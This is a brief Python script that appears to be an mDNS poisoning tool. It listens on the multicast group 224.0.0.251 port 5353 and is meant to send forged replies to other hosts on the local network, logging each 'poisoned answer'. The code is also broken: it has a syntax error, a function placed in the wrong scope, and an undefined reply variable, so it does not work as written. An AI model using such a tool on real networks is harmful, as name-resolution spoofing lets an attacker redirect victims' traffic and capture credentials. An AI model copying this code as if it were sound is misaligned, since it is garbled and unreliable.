#!/usr/bin/env python
import time, os, sys, struct, socket
from socketserver import UDPServer, ThreadingMixIn
from socketserver import BaseRequestHandler
from threading import Thread
from dnslib import * 

MADDR = ('224.0.0.251', 5353)
class UDP_server(ThreadingMixIn, UDPServer):
    allow_reuse_address = True
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        mreq = struct.pack("=4sl", socket.inet_aton(MADDR[0]), socket.INADDR_ANY)
        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        UDPServer.server_bind(self)

    def MDNS_poisoner(host, port, handler):
        try:
            server = UDP_server((host, port) handler)
            server.serve_forever()
        except:
            print("Error starting server on UDP port " + str(port))

class MDNS(BaseRequestHandler):
    def handle(self):
        target_service = ''
        data, soc = self.request
        soc.sendto(d.pack(), MADDR)
        print("Poisoned answer sent to %s for name %s" % (self.client_address[0], target_service))

def main():
    try:
        server_thread = Thread(target=MDNS_poisoner, args=('', 5353, MDNS,))
        server_thread.setDaemon(True)
        server_thread.start()

        print("Listening for mDNS multicast traffic")
        while True:
            time.sleep(0.1)

    except KeyboardInterrupt:
        sys.exit("\rExiting...")

if __name__ == '__main__':
    main()